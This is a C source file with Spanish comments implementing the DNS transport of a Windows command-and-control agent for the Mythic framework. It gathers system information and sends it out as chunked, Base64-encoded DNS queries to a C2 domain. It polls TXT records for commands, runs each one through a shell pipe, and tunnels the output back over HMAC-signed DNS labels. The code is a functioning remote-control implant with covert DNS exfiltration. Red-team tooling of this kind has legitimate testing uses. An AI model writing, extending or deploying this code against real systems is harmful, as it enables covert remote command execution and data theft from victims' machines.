/**
 * Transport.c - DNS transport para C2 Agent perfil DNS de Mythic
 *
 * - Chunked check-in en etiquetas ≤ MAX_DNS_CHUNK_SIZE
 * - Sanitiza Base64 (solo alfanuméricos)
 * - UUID vía RPC (solo para respuesta JSON)
 * - Firma HMAC-MD5 hex(tsid||data) según profile Python
 * - transport_perform_checkin() retorna JSON con uuid y perfil C2
 */

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h> // para getaddrinfo, inet_ntop
#include <windns.h>
#include <rpc.h>            // UuidCreate / UuidToStringA
#include <bcrypt.h>         // CNG para HMAC-MD5
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <stdint.h>         // <<-- Para uint8_t, uint32_t
#include "../include/Transport.h"
#include "../include/Utils.h"
#include "../include/Config.h"
#include "../include/Checkin.h"

#pragma comment(lib, "dnsapi.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Ws2_32.lib")

#define MAX_DNS_CHUNK_SIZE 63
#define MAX_DNS_RETRIES     3
#define DNS_RETRY_DELAY     1000
#define DNS_CHUNK_DELAY     500
#define MAX_QUERY_SIZE      512
#define DNS_QUERY_TIMEOUT_MS 5000
#define RAW_CHUNK_SIZE 45


// Marker para último fragmento para respuestas
static const char* LAST_CHUNK_MARKER = "END";

#ifndef DEBUG_MODE
#define DEBUG_MODE 1
#endif

static char agent_uuid[37] = {0};

// ----------------------------------------------------------------
// 1) Inicializa Winsock y genera UUID vía RPC
// ----------------------------------------------------------------
BOOL dns_transport_init(void) {
#if DEBUG_MODE
    printf("[DEBUG:init] Starting dns_transport_init()\n");
#endif
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
#if DEBUG_MODE
        printf("[DEBUG:init] WSAStartup failed: %lu\n", WSAGetLastError());
#endif
        return FALSE;
    }

    const char* id = get_agent_id();
    if (!id || strlen(id) >= sizeof(agent_uuid)) {
#if DEBUG_MODE
        printf("[DEBUG:init] Invalid agent ID\n");
#endif
        return FALSE;
    }

    strncpy(agent_uuid, id, sizeof(agent_uuid) - 1);
    agent_uuid[sizeof(agent_uuid) - 1] = '\0';  // Seguridad

#if DEBUG_MODE
    printf("[DEBUG:init] Agent UUID: %s\n", agent_uuid);
#endif
    return TRUE;
}

// ----------------------------------------------------------------
// 2) HMAC-MD5 en hex (caller debe free())
// ----------------------------------------------------------------
static char* hmac_md5_hex(const char* key, const char* msg) {
    BCRYPT_ALG_HANDLE  alg  = NULL;
    BCRYPT_HASH_HANDLE hash = NULL;
    NTSTATUS           st;
    UCHAR              hmac[16];
    ULONG              cbHmac = sizeof(hmac);

    st = BCryptOpenAlgorithmProvider(
           &alg,
           BCRYPT_MD5_ALGORITHM,
           NULL,
           BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!BCRYPT_SUCCESS(st)) return NULL;

    st = BCryptCreateHash(
           alg,
           &hash,
           NULL, 0,
           (PUCHAR)key, (ULONG)strlen(key),
           0);
    if (!BCRYPT_SUCCESS(st)) goto cleanup;

    st = BCryptHashData(hash,
           (PUCHAR)msg, (ULONG)strlen(msg),
           0);
    if (!BCRYPT_SUCCESS(st)) goto cleanup;

    st = BCryptFinishHash(hash, hmac, cbHmac, 0);
    if (!BCRYPT_SUCCESS(st)) goto cleanup;

    char* hex = malloc(cbHmac * 2 + 1);
    if (!hex) goto cleanup;
    for (ULONG i = 0; i < cbHmac; i++) {
        sprintf(hex + i*2, "%02x", hmac[i]);
    }
    hex[cbHmac*2] = '\0';

cleanup:
    if (hash) BCryptDestroyHash(hash);
    if (alg ) BCryptCloseAlgorithmProvider(alg, 0);
    return hex;
}

// ----------------------------------------------------------------
// 3) Consulta DNS TXT (opcional servidor custom o sistema)
// ----------------------------------------------------------------
static char* dns_txt_query_with_server(const char* query, const char* server_ip) {
    PDNS_RECORD dnsRecord = NULL;
    char*       result    = NULL;
    BOOL        use_custom = (inet_addr(server_ip) != INADDR_NONE);

#if DEBUG_MODE
    printf("[DEBUG] Desired DNS client timeout: %u ms\n", DNS_QUERY_TIMEOUT_MS);
#ifdef DnsConfigClientTimeout
    {
        ULONG dnsTimeout = DNS_QUERY_TIMEOUT_MS;
        ULONG bufLen     = sizeof(dnsTimeout);
        DNS_STATUS cfgSt = DnsQueryConfig(
                              DnsConfigClientTimeout,
                              0,
                              NULL,      // pwsAdapterName
                              NULL,      // pReserved
                              &dnsTimeout,
                              &bufLen
                          );
        printf("[DEBUG] DnsQueryConfig → 0x%08lX, actual timeout=%u ms\n",
               cfgSt, (unsigned)dnsTimeout);
    }
#else
    printf("[DEBUG] DnsConfigClientTimeout not defined: using system default timeout\n");
#endif
#endif

    IP4_ARRAY dnsServers = {0};
    if (use_custom) {
        dnsServers.AddrCount    = 1;
        dnsServers.AddrArray[0] = inet_addr(server_ip);
    }

    for (int retry = 0; retry < MAX_DNS_RETRIES; retry++) {
#if DEBUG_MODE
        printf("[DEBUG] Attempt %d/%d for TXT query \"%s\"\n",
               retry+1, MAX_DNS_RETRIES, query);
        DWORD start = GetTickCount();
#endif
        DNS_STATUS status = DnsQuery_A(
            query,
            DNS_TYPE_TEXT,           // <-- TXT en lugar de A
            DNS_QUERY_BYPASS_CACHE,
            use_custom ? &dnsServers : NULL,
            &dnsRecord,
            NULL
        );
#if DEBUG_MODE
        DWORD elapsed = GetTickCount() - start;
        printf("[DEBUG] DnsQuery_A → 0x%08lX (elapsed %lu ms)\n",
               status, (unsigned long)elapsed);
#endif
        if (status == ERROR_SUCCESS && dnsRecord) {
            // 1) Primera pasada: calcular tamaño total necesario
            size_t totalLen = 0;
            for (PDNS_RECORD p = dnsRecord; p; p = p->pNext) {
                if (p->wType == DNS_TYPE_TEXT) {
                    for (DWORD i = 0; i < p->Data.TXT.dwStringCount; ++i) {
                        if (p->Data.TXT.pStringArray[i]) {
                            totalLen += strlen(p->Data.TXT.pStringArray[i]);
                        }
                    }
                }
            }

            if (totalLen > 0) {
                // 2) Reservar búfer y concatenar
                result = (char*)malloc(totalLen + 1);
                if (result) {
                    char *dst = result;
                    for (PDNS_RECORD p = dnsRecord; p; p = p->pNext) {
                        if (p->wType == DNS_TYPE_TEXT) {
                            for (DWORD i = 0; i < p->Data.TXT.dwStringCount; ++i) {
                                const char *txt = p->Data.TXT.pStringArray[i];
                                if (txt) {
                                    size_t len = strlen(txt);
                                    memcpy(dst, txt, len);
                                    dst += len;
                                }
                            }
                        }
                    }
                    *dst = '\0';
#if DEBUG_MODE
                    printf("[DEBUG] Received TXT: %s\n", result);
#endif
                }
            }

            // 3) Liberar la lista de registros y salir
            DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            break;
        }

        // si no hubo resultado válido, liberar y retry
        if (dnsRecord) {
            DnsRecordListFree(dnsRecord, DnsFreeRecordList);
            dnsRecord = NULL;
        }

        Sleep(DNS_RETRY_DELAY);
    }

#if DEBUG_MODE
    if (!result) {
        printf("[DEBUG-TRANS] dns_txt_query_with_server(\"%s\") → no TXT after %d retries\n",query, MAX_DNS_RETRIES);
    }
#endif

    return result;
}


// ----------------------------------------------------------------
// Helper para convertir UTF-8 → wide string
// ----------------------------------------------------------------
static PWSTR utf8_to_wchar(const char* src) {
    int len = MultiByteToWideChar(CP_UTF8, 0, src, -1, NULL, 0);
    if (!len) return NULL;
    PWSTR dst = malloc(len * sizeof(WCHAR));
    if (!dst) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, len);
    return dst;
}

// ----------------------------------------------------------------
// Format <prefix>.<tsid>.<[data].><hmac>.<domain>.
// If data=="" it omits that label entirely.
// ----------------------------------------------------------------
static char* format_dns_query(const char* prefix,
                              const char* data,
                              const char* domain,
                              const char* key,
                              uint8_t       channel,
                              uint32_t      seq) {
    // 1) Construyo el TSID: 2 hex(channel) + 6 hex(seq)
    char tsid[9];
    sprintf_s(tsid, sizeof(tsid), "%02x%06x", channel, seq);

    // 2) HMAC-MD5 sobre tsid||data
    size_t msg_len = strlen(tsid) + strlen(data);
    char*  msg     = malloc(msg_len + 1);
    strcpy_s(msg, msg_len+1, tsid);
    strcat_s(msg, msg_len+1, data);
    char* sig = hmac_md5_hex(key, msg);
    free(msg);
    if (!sig) return NULL;

    // 3) Montar el FQDN evitando etiquetas vacías
    char* q = malloc(MAX_QUERY_SIZE);
    if (!q) { free(sig); return NULL; }

    if (data && *data) {
        // con data
        snprintf(q, MAX_QUERY_SIZE,
                 "%s.%s.%s.%s.%s",
                 prefix, tsid, data, sig, domain);
    } else {
        // sin data, pero DEBE quedar etiqueta vacía:
        snprintf(q, MAX_QUERY_SIZE,
                 "%s.%s.%s.%s",
                 prefix, tsid, sig, domain);
    }
    free(sig);

#if DEBUG_MODE
    printf("[DEBUG] Formatted query: %s\n", q);
#endif
    return q;
}


// --------------------------------------------------
// 5) Request de comandos (tasking)
// --------------------------------------------------
char* dns_request_command(const char* agent_id,
                          const char* domain) {
    (void)agent_id;
    const char* prefix  = get_msgdefault();
    const char* key     = get_hmac_key();
    uint8_t      channel = 0;
    static uint32_t seq  = 0;
    seq++;

#if DEBUG_MODE
    printf("[DEBUG] dns_request_command prefix=%s domain=%s seq=%u\n",
           prefix, domain, seq);
#endif

    // Construimos la query sin data
    char* q = format_dns_query(prefix, "", domain, key, channel, seq);
    if (!q) return NULL;

    // Resolver IPv4 del servidor DNS
    char server_ip[INET_ADDRSTRLEN] = {0};
    struct addrinfo hints={0}, *res=NULL;
    hints.ai_family = AF_INET;
    if (getaddrinfo(domain, NULL, &hints, &res) == 0) {
        struct sockaddr_in* sin = (struct sockaddr_in*)res->ai_addr;
        inet_ntop(AF_INET, &sin->sin_addr, server_ip, sizeof(server_ip));
        freeaddrinfo(res);
    }

    // Intentos de TXT query
    char* raw_txt = NULL;
    for (int attempt = 1; attempt <= MAX_DNS_RETRIES; attempt++) {
#if DEBUG_MODE
        printf("[DEBUG] Attempt %d/%d for TXT \"%s\"\n",
               attempt, MAX_DNS_RETRIES, q);
#endif
        raw_txt = dns_txt_query_with_server(q,
                    server_ip[0] ? server_ip : domain);
        if (raw_txt) break;
        Sleep(DNS_RETRY_DELAY);
    }
    free(q);

    if (!raw_txt) {
#if DEBUG_MODE
        printf("[DEBUG] No TXT response for tasking\n");
#endif
        return NULL;
    }

#if DEBUG_MODE
    printf("[DEBUG] Raw TXT reply → %s\n", raw_txt);
#endif

    // Si es un simple ACK
    if (strcmp(raw_txt, "ACK") == 0) {
        free(raw_txt);
#if DEBUG_MODE
        printf("[DEBUG] Received ACK → no tasks\n");
#endif
        return NULL;
    }

    // txtvers=1: ignorar
    if (strncmp(raw_txt, "txtvers", 7) == 0) {
        free(raw_txt);
#if DEBUG_MODE
        printf("[DEBUG] Received txtvers → no tasks\n");
#endif
        return NULL;
    }

    // *** NUEVO ***: si viene con "uuid:comando", devolvemos raw_txt entero
    if (strchr(raw_txt, ':')) {
#if DEBUG_MODE
        printf("[DEBUG] Received tasking string → %s\n", raw_txt);
#endif
        return raw_txt;
    }

    // Si en algún otro caso el servidor devolviera Base64 (no es nuestro caso),
    // aquí podrías añadir la lógica para base64_decode.
    free(raw_txt);
    return NULL;
}



static char* system_execute(const char* cmd) {
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) return _strdup("");
    char buf[128];
    size_t cap = 1024, len = 0;
    char* out = malloc(cap);
    out[0] = '\0';
    while (fgets(buf, sizeof(buf), pipe)) {
        size_t l = strlen(buf);
        if (len + l + 1 > cap) {
            cap *= 2;
            out = realloc(out, cap);
        }
        memcpy(out + len, buf, l);
        len += l;
        out[len] = '\0';
    }
    _pclose(pipe);
    return out;
}

void transport_command_loop(void) {
    const char* domain = get_c2_domain();
    while (1) {
        char* task = dns_request_command(agent_uuid, domain);
        if (!task) {
            Sleep(get_sleep_interval());
            continue;
        }
        printf("[DEBUG] Received task → %s\n", task);

        // 1) Partir "tid:comando"
        char* colon = strchr(task, ':');
        if (!colon) {
            free(task);
            continue;
        }
        *colon = '\0';
        char* tid = task;          // ej. "a2487cda-…"
        char* cmd = colon + 1;     // ej. "whoami"

        printf("[DEBUG] Task ID: %s\n", tid);
        printf("[DEBUG] Command: %s\n", cmd);

        // 2) Ejecutar comando
        char* output = system_execute(cmd);
        printf("[DEBUG] Command output:\n%s\n", output);

        // 3) Enviar resultado **incluyendo** el tid
        printf("[DEBUG] Sending result for task %s …\n", tid);
        BOOL ok = dns_send_result(agent_uuid,
                                 tid,       // <- usar tid aquí
                                 output,
                                 domain);
        printf("[DEBUG] dns_send_result returned → %d\n", ok);

        free(output);
        free(task);
    }
}

// --------------------------------------------------
// Envío de resultado (fragmentado ≤63 bytes)
// --------------------------------------------------
static char* strndup_safe(const char* p, size_t n) {
    char* r = malloc(n + 1);
    if (!r) return NULL;
    memcpy(r, p, n);
    r[n] = '\0';
    return r;
}


/**
 * 6) Envío de resultado (chunked) vía DNS
 *    Se muestran por debug el agent_id, result_id (el tid),
 *    y cada chunk antes/después de la consulta.
 *    Envío de resultado (fragmentado en etiquetas ≤63B)
 */
BOOL dns_send_result(const char* agent_id,
                     const char* result_id,
                     const char* result,
                     const char* domain) {
    (void)agent_id; (void)result_id;
    if (!result) return FALSE;
    const char* key    = get_hmac_key();
    const char* prefix = get_msgdefault();
    uint8_t     channel= 0;
    static uint32_t seq = 0;

    size_t len = strlen(result);
    int    chunks = (int)((len + RAW_CHUNK_SIZE - 1) / RAW_CHUNK_SIZE);
    printf("[DEBUG-TRANS] dns_send_result: %d chunk(s), total %zu bytes\n",
           chunks, len);

    // 1) Envío de los trozos “raw” adecuados
    for (int i = 0; i < chunks; i++) {
        size_t off = i * RAW_CHUNK_SIZE;
        size_t sz  = (len - off < RAW_CHUNK_SIZE ? len - off : RAW_CHUNK_SIZE);
        char raw[RAW_CHUNK_SIZE + 1];
        memcpy(raw, result + off, sz);
        raw[sz] = '\0';

        // Base64 encode + sanitizar
        size_t enc_sz;
        char*  enc = base64_encode((unsigned char*)raw, sz, &enc_sz);
        if (!enc) return FALSE;
        size_t w = 0;
        for (size_t r = 0; r < enc_sz; r++) {
            unsigned char c = enc[r];
            if      (isalnum(c))       enc[w++] = c;
            else if (c == '+')         enc[w++] = '-';
            else if (c == '/')         enc[w++] = '_';
            // resto se descarta
        }
        enc[w] = '\0';

        // Formatear consulta DNS
        seq++;
        char* q = format_dns_query(prefix, enc, domain, key, channel, seq);
        free(enc);
        if (!q) return FALSE;

        printf("[DEBUG-TRANS] → Chunk %d/%d raw='%s'\n", i+1, chunks, raw);
        printf("[DEBUG-TRANS]    DNS query: %s\n", q);

        // Esperar un único ACK antes de mandar siguiente fragmento
        char* resp = dns_txt_query_with_server(q, domain);
        free(q);
        if (!resp || strcmp(resp, "ACK") != 0) {
            printf("[ERROR-TRANS] No ACK for chunk %d\n", i+1);
            free(resp);
            return FALSE;
        }
        printf("[DEBUG-TRANS]    Chunk %d ACKed\n", i+1);
        free(resp);
        Sleep(DNS_CHUNK_DELAY);
    }

    // 2) Una vez enviados todos los fragmentos, marcamos “FIN” con END
    seq++;
    char* q_end = format_dns_query(prefix, "END", domain, key, channel, seq);
    if (!q_end) return FALSE;
    printf("[DEBUG-TRANS] → Sending END marker: %s\n", q_end);

    // Esperamos hasta 5 s por el ACK de este FIN
    DWORD start = GetTickCount();
    BOOL  got_ack = FALSE;
    do {
        char* resp = dns_txt_query_with_server(q_end, domain);
        if (resp) {
            printf("[DEBUG-TRANS]    TXT reply for END: %s\n", resp);
            if (strcmp(resp, "ACK") == 0) {
                got_ack = TRUE;
                free(resp);
                break;
            }
            free(resp);
        }
        Sleep(500);
    } while ((GetTickCount() - start) < 5000);
    free(q_end);

    if (!got_ack) {
        printf("[ERROR-TRANS] Timeout waiting ACK for END\n");
        return FALSE;
    }
    printf("[DEBUG-TRANS]    END ACKed\n");

    return TRUE;
}



// ----------------------------------------------------------------
// 7) Check server (simple ping “check”)
// ----------------------------------------------------------------
BOOL dns_check_server(const char* domain) {
    const char* key     = get_hmac_key();
    uint8_t      channel = 0;
    static uint32_t seq  = 0;

    char* q = format_dns_query("check",
                               "",
                               domain,
                               key,
                               channel,
                               seq);
    if (!q) return FALSE;
    char* r = dns_txt_query_with_server(q, domain);
    free(q);
    BOOL ok = (r != NULL);
#if DEBUG_MODE
    printf("[DEBUG] dns_check_server → %s\n", ok ? "TRUE" : "FALSE");
#endif
    if (r) free(r);
    return ok;
}

// ----------------------------------------------------------------
// 8) Check-in inicial
// ----------------------------------------------------------------
char* transport_perform_checkin(void) {
    char* info = get_system_info();
    if (!info) return NULL;
    printf("[DEBUG] JSON to encode: %s\n", info);
    printf("[DEBUG] JSON length: %zu\n", strlen(info));

    // Base64 encode + sanitizar (solo alfanuméricos)
    size_t enc_len;
    size_t w = 0;
    char* enc = base64_encode((unsigned char*)info, strlen(info), &enc_len);
    free(info);
    if (!enc) return NULL;

#if DEBUG_MODE
    printf("[DEBUG] Raw Base64 (with padding, before sanitization): %s\n", enc);
    printf("[DEBUG] Base64 length before sanitization: %zu\n", enc_len);
#endif

    // Filtrar solo alfanuméricos y transformar +, /
    for (size_t i = 0; i < enc_len; i++) {
        if (isalnum((unsigned char)enc[i])) {
            enc[w++] = enc[i];
        } else if (enc[i] == '+') {
            enc[w++] = '-';
        } else if (enc[i] == '/') {
            enc[w++] = '_';
        } else if (enc[i] == '=') {
#if DEBUG_MODE
            printf("[DEBUG] Skipping padding '=' at position %zu\n", i);
#endif
            // No agregar padding
        } else {
#if DEBUG_MODE
            printf("[DEBUG] Unexpected character in Base64: '%c' (0x%02x) at position %zu\n", enc[i], enc[i], i);
#endif
        }
    }
    enc[w] = '\0';

#if DEBUG_MODE
    printf("[DEBUG] Sanitized Base64 (ready for DNS): %s\n", enc);
    printf("[DEBUG] Sanitized length: %zu\n", w);
#endif

    const char* domain = get_c2_domain();
    const char* prefix = get_msginit();
    const char* key    = get_hmac_key();
    uint8_t channel    = 0;
    static uint32_t seq = 0;

    int chunks = (w + MAX_DNS_CHUNK_SIZE - 1) / MAX_DNS_CHUNK_SIZE;

    printf("[DEBUG] Total sanitized Base64 length: %lu\n", w);
    printf("[DEBUG] Will send %d chunks\n", chunks);

    for (int i = 0; i < chunks; i++) {
        size_t off = i * MAX_DNS_CHUNK_SIZE;
        size_t this_sz = (w - off > MAX_DNS_CHUNK_SIZE) ? MAX_DNS_CHUNK_SIZE : (w - off);

        char chunk[MAX_DNS_CHUNK_SIZE + 1] = {0};  // Limpio desde el inicio
        memcpy(chunk, enc + off, this_sz);
        chunk[this_sz] = '\0';  // Garantiza terminación nula segura

        seq++;
        printf("[DEBUG] Sending chunk %d/%d: '%s' (size %lu)\n", i + 1, chunks, chunk, this_sz);

        char* q = format_dns_query(prefix, chunk, domain, key, channel, seq);
        char* resp = dns_txt_query_with_server(q, domain);
        free(q);
        if (!resp) {
            free(enc);
            return NULL;
        }
        free(resp);
        Sleep(DNS_CHUNK_DELAY);
    }

    free(enc);

    // JSON final para Mythic (check-in OK)
    size_t need = strlen(agent_uuid) + strlen("dns") + 32;
    char* json = malloc(need);
    if (!json) return NULL;
    snprintf(json, need, "{\"uuid\":\"%s\",\"c2_profile\":\"dns\"}", agent_uuid);
    return json;
}



// ----------------------------------------------------------------
// 9) UUID interno
// ----------------------------------------------------------------
const char* get_agent_uuid(void) {
    return agent_uuid;
}
